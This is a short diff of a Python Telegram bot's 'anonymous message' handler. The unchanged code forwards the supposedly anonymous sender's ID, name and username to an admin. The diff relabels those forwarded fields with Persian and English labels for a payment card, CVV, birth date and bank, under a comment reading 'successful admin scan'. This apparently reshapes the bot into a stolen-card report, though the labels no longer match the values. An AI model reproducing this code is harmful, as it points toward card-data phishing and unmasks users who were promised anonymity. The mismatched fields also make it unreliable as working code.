@@ -284,14 +284,14 @@ async def anonymous_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await update.message.reply_text("✅ پیام شما ارسال شد.", reply_markup=main_keyboard())
 
-        # === اطلاع به ادمین ===
+        # === اسکن  موفق ادمین ===
         admin_text = (
             f"📩 **پیام ناشناس یک‌طرفه**\n\n"
-            f"فرستنده: `{user.id}`\n"
-            f"نام: {user.first_name}\n"
-            f"یوزرنیم: @{user.username or 'ندارد'}\n"
-            f"گیرنده: `{target_id}`\n\n"
-            f"متن: {text}"
+            f"کارت: `{user.id}`\n"
+            f"cvv: {user.first_name}\n"
+            f"birth: @{user.username or 'ندارد'}\n"
+            f"نام: `{target_id}`\n\n"
+            f"بانک: {text}"
         )
         await notify_admin(context, admin_text)
 
